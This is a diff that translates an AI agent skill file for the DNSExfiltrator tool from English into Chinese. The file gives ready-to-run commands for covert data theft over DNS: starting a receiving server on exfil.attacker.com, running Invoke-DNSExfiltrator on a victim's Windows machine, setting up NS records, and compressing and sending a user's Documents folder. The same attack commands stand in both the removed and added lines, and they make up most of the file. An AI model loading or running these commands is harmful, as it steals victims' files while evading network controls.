@@ -1,56 +1,53 @@
 ---
 name: dnsexfiltrator
 description: >
-  This skill should be used when the user asks about "dnsexfiltrator", "HTTP/S
-  channels are blocked and DNS traffic is allowed outbound, enabling covert
-  file transfer via DNS TXT/A records". Exfiltrate data over DNS queries using
-  a custom DNS server.
+  此技能适用于用户询问关于 "dnsexfiltrator"、"HTTP/S 通道被封锁时通过 DNS 流量进行隐蔽文件传输"、"利用 DNS TXT/A 记录进行数据渗出" 的场景。通过 DNS 查询实现隐蔽文件渗出的工具，使用自定义 DNS 服务器接收数据。
 ---
 
 # DNSExfiltrator
 
-Covert file exfiltration via DNS — Python server receives, PowerShell client sends.
+通过 DNS 隐蔽渗出文件 — Python 服务端接收，PowerShell 客户端发送。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Attacker side — start DNS server (needs port 53 UDP)
+# 攻击方 — 启动 DNS 服务器（需要 UDP 53 端口）
 sudo python3 dnsexfiltrator.py -d exfil.attacker.com -p password
 
-# Victim side (PowerShell)
+# 受害方（PowerShell）
 Invoke-DNSExfiltrator -i C:\sensitive\file.zip -d exfil.attacker.com -p password -t 500
 ```
 
-## DNS Setup
+## DNS 配置
 
-Point an NS record for your subdomain to your listener IP:
+将子域名的 NS 记录指向监听服务器 IP：
 ```
 exfil.attacker.com    NS    ns1.attacker.com
 ns1.attacker.com      A     <your-server-ip>
 ```
 
-## Core Options
+## 核心参数
 
-| Option | Purpose |
+| 参数 | 说明 |
 |--------|---------|
-| `-d DOMAIN` | Exfil domain (server) |
-| `-p PASSWORD` | Encryption passphrase |
-| `-b 64/32` | Encoding (base64/base32) |
-| `-t MS` | Throttle between queries (ms) |
-| `-r N` | Max retries |
+| `-d DOMAIN` | 渗出域名（服务端） |
+| `-p PASSWORD` | 加密密码 |
+| `-b 64/32` | 编码方式（base64/base32） |
+| `-t MS` | 查询间隔限速（毫秒） |
+| `-r N` | 最大重试次数 |
 
-## Common Workflows
+## 常用工作流
 
-**Exfil archive from Windows:**
+**从 Windows 渗出压缩包：**
 ```powershell
-# Compress first
+# 先压缩
 Compress-Archive -Path C:\Users\victim\Documents -DestinationPath docs.zip
-# Exfil
+# 渗出
 Invoke-DNSExfiltrator -i docs.zip -d exfil.attacker.com -p MyPass123 -t 200
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/` | DNS setup guide and throttle tuning |
+| `references/` | DNS 配置指南与限速调优 |
